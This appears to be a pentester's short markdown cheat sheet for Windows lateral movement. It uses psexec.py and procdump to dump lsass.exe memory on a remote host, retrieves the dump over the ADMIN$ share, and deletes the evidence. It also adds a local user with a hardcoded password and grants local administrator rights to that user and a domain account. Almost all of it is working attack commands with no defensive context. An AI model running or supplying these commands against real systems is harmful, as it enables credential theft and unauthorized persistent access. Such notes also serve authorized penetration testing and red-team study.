# psexec

## procdump lsass.exe

``` bash
psexec.py -c procdump.exe "$domain/$domuser:$userpassword@$cible" "-acceptEula -ma lsass.exe C:/windows/lsass.dmp"
smbget -w $domain -U $domuser%$userpassword smb://$cible/ADMIN$/lsass.dmp
psexec.py "$domain/$domuser:$userpassword@$cible" "del C:/windows/lsass.dmp"
```

## Commands to add a local admin

``` batch
net user /add jdupond AWNzcek2382OD
net localgroup administrators jdupond /add
net localgroup administrators CONTOSO\jdurand /add
```
